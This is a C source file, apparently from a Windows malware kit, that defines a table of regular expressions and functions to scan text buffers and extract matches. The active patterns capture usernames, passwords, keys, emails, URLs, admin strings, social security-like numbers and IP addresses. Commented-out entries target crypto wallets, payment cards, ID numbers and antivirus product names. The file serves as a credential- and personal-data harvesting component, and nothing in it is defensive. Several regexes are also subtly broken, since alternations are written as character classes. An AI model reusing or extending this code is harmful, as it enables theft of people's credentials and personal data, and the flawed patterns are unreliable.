#include <windows.h>
#include <shlwapi.h>
#include "include/gurrukit.h"
#include "include/memory.h"
#include "include/external/slre.h"
#include "include/regextract.h"

#pragma comment(lib, "shlwapi.lib")


// Evil examples... if do you like more regexp write them yourself
RegExpression Regs[] = {
	{ 0, "", 0, 1 },
	{ 1, "^Hello Kitty$", 0, 1 },

	{ 2,	"[usr|user|usuario|pass|password|pwd|key|clave|login|account][=,:,&,\\?,;,#,\\s,\\^,\\$,%,\\|,\\\\,/,@,\\+,-,\\.,\\,]+?(\\S+)"
			"[=,:,&,\\?,;,#,\\s,\\^,\\$,%,\\|,\\\,/,@,\\+,-,\\.,\\,]+?[usr|user|usuario|pass|password|pwd|key|clave|login|account]+?[=,:,"
			"&,\\?,;,#,\\s,\\^,\\$,%,\\|,\\\\,/,@,\\+,-,\\.,\\\,]+?(\\S+)", 
			2, 1 }, //relative testing
	//{ 3, "[usr|user|usuario|pass|password|pwd|key|clave|account][=,:,&,\\?,;,#,\\s,\\^,\\$,%,\\|,\\\\,/,@,\\+,-,\\.,\\,]+?(\\S+)", 1, 1 },													
/*	{ 4, 
		"[user|usr|pass|password|pwd|key|account][=,:,&,\\?,;,#,\\s,\\^,\\$,%,\\|,\\\\,/,@,\\+,-,\\.,\\,](\\S+)\\n[user|usr|pass"
		 "|password|pwd|key][=,:,&,\\?,;,#,\\s,\\^,\\$,%,\\|,\\\\,/,@,\\+,-,\\.,\\,](\\S+)", 
		 2, 1 }, // untested
		 */
	//{ 5, "[bitcoin|litecoin|dash|darkcoin|paysafecard|ukash|wallet|paypal|payment|cart|shop|card|credit]", 0, 1 },
	//{ 6, "[dni|nif]", 0, 1 },
	//{ 7, "[facebook|twitter|linkedin]", 0, 1 },
	//{ 8, "[juegos|games|playing|player|jugar]", 0, 1 },
	//{ 9, "[descargas|download|warez|movies|peliculas|ver\\sgratis|free\\sshow]", 0, 1 },
	//{ 10, "[how\sto]", 0, 1 },
	{ 11, "(\\S+)@(\\S+)\\.(\\S+)", 0, 1 },
	//{ 12, "[kasper|nod3|avas|avir|antiv|viru|cleani|limpi|clams|drwat|pfish|gmer|norto|pand]", 0, 1 },
	//{ 13, "[rsa|pgp|gpg]*?[key|cert]", 0, 1 },
	{ 14, "[http|https|ssh|irc|skype|ftp|ftps|mailto|smtp|smtps|imap|imaps|pop3|pop3s|socks|proxy|tunnel]://(\\S+)", 0, 1 },
	{ 15, "(\\S+)?://(\\S+)", 2, 1 },
	//{ 16, "[admin|root]", 0, 1 },
	{ 17, "admin[i|s]\\S+", 0, 1 },
	{ 18, "[ss|s|social|soc|n|num|number][\\.,\\s,\\,,/,\\\\,-,:][ss|s|social|n|num|number][\\.,\\s,\\,,/,\\\\,-,:]", 0, 1 },
	{ 19, "\\d\\.\\d\\.\\d\\.\\d", 0, 1 },
	{ 20, "htt[p|s]://\\S+\\.jennylab\\.\\S+", 0, 1 }, // jennylab over http/s 
	{ NULL, NULL, 0, 0 }
};



BOOL RegExtractW(lpRegExtractStruct lpExtract, const wchar_t *uBuff) {
	DWORD dwCount = 0;
	BOOL bStatus = FALSE, bUsedDefault;
	struct slre_cap caps[MAX_EXTRACT_COUNT];
	char *lpTmpBuff = LocalMemoryAlloc(lstrlenW(uBuff)*2);

	if (WideCharToMultiByte(CP_ACP, WC_COMPOSITECHECK | WC_DEFAULTCHAR, uBuff, lstrlenW(uBuff), lpTmpBuff, lstrlenW(uBuff), NULL, &bUsedDefault) < 0) {
		LocalMemoryFree(lpTmpBuff);
		return(bStatus);
	}


	char *lpBuff = LocalMemoryAlloc(lstrlenW(uBuff)+1);
	lstrcpynA(lpBuff, lpTmpBuff, lstrlenW(uBuff) + 1);
	LocalMemoryFree(lpTmpBuff);

	bStatus = RegExtractA(lpExtract, lpBuff);
	
	LocalMemoryFree(lpBuff); // possible leak
	return(bStatus);
}


BOOL RegExtractA(lpRegExtractStruct lpExtract, const char *lpBuff) {
	DWORD dwCount = 0, dwNumItems;
	BOOL bStatus = FALSE, bCase;
	struct slre_cap caps[MAX_EXTRACT_COUNT];
	char *pRegEx;

	while (Regs[dwCount].lpRegExpression != NULL) {
		pRegEx = (const char *)Regs[dwCount].lpRegExpression;
		bCase = Regs[dwCount].bCaseSensitive;
		dwNumItems = Regs[dwCount].dwNumberOfItems;
		if (slre_match(pRegEx, lpBuff, lstrlenA(lpBuff), (struct slre_cap *)&caps, dwNumItems, bCase) > 0) {
			lpExtract->bMatch = bStatus = TRUE;
			lpExtract->dwCount = 0;
			lpExtract->dwID = Regs[dwCount].dwID;
			
			if (Regs[dwCount].dwNumberOfItems == 0)
				return(bStatus);
	
			DWORD dwItemsCount = 0;
			lpExtract->dwCount = Regs[dwCount].dwNumberOfItems;

			while (dwItemsCount != Regs[dwCount].dwNumberOfItems) {
				wchar_t *uGranulanity = LocalMemoryAlloc((caps[dwItemsCount].len+1) * 2);
				lpExtract->uItems[dwItemsCount] = MemoryAlloc((caps[dwItemsCount].len+1) * 2);
				
				if (MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, caps[dwItemsCount].ptr, caps[dwItemsCount].len, uGranulanity, caps[dwItemsCount].len) < 0) {
					//wnsprintf(lpExtract->uItems[dwItemsCount], caps[dwItemsCount].len, L"Composite Error");			
			
				}
				else {
					lstrcpynW(lpExtract->uItems[dwItemsCount], uGranulanity, caps[dwItemsCount].len+1);
					OutputDebugStringW(lpExtract->uItems[dwItemsCount]);
				}

				LocalMemoryFree(uGranulanity);
				dwItemsCount++;
			}
			return(bStatus);
		}
		dwCount++;
	}
	return(bStatus);
}

void RegExtractClose(lpRegExtractStruct lpExtract) {
	DWORD dwItemsCount = lpExtract->dwCount;


	do {

		if (
			lpExtract->uItems[dwItemsCount]							&& lpExtract->uItems[dwItemsCount] != (PVOID)-1				&&
			lpExtract->uItems[dwItemsCount] != (PVOID)0xCCCCCCCC		&& lpExtract->uItems[dwItemsCount] != (PVOID)0x0000FFFF		&&
			lpExtract->uItems[dwItemsCount] != (PVOID)0xDEADC0DE
			) 
				MemoryFree(lpExtract->uItems[dwItemsCount]);
				

	} while (dwItemsCount--);


}
